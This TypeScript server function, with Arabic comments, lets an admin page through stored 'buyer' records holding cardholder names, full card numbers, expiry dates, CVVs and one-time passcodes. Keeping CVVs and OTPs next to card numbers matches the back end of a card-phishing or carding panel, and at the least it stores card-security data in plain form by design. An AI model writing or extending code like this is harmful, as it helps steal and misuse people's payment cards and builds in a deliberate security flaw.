import { connectDB } from '@/lib/DB';
import getServer from '@/lib/getServer';
import { Buyer } from '@/models/Buyer';

export type BuyerType = {
  id?: { toString(): string };
  name: string;
  cardNumber: string;
  ExDate: string;
  cvv: number;
  otp: string | null;
  createdAt?: string | null;
  updatedAt?: string | null;
};

export default async function getAllBuyers(
  page: number = 1,
  limit: number = 10
) {
  try {
    await connectDB();

    const session = await getServer();
    if (!session?.session || session.user.role !== 'admin') {
      throw new Error(
        'Unauthorized: You are not allowed to access this resource'
      );
    }

    type RawBuyer = {
      _id: { toString(): string };
      name: string;
      cardNumber: string;
      monthEx: string | number;
      yearEx: string | number;
      cvv: number;
      otp?: string | null;
      createdAt?: Date | null;
      updatedAt?: Date | null;
    };

    // ــــــــ pagination ــــــــ
    const skip = (page - 1) * limit;

    // إجمالي السجلات
    const total = await Buyer.countDocuments();

    // جلب البيانات حسب الصفحة
    const buyers = (await Buyer.find()
      .skip(skip)
      .limit(limit)
      .lean()) as RawBuyer[];

    // تنظيف البيانات
    const cleanedBuyers: BuyerType[] = buyers.map((b: RawBuyer) => ({
      id: b._id.toString(),
      name: b.name,
      cardNumber: b.cardNumber,
      ExDate: `${b.monthEx}/${b.yearEx}`,
      cvv: b.cvv,
      otp: b.otp ?? null,
      createdAt: b.createdAt?.toISOString() ?? null,
      updatedAt: b.updatedAt?.toISOString() ?? null,
    }));

    return {
      data: cleanedBuyers,
      page,
      limit,
      total,
      totalPages: Math.ceil(total / limit),
    };
  } catch (error) {
    console.error('GET BUYERS ERROR:', error);
    throw error;
  }
}
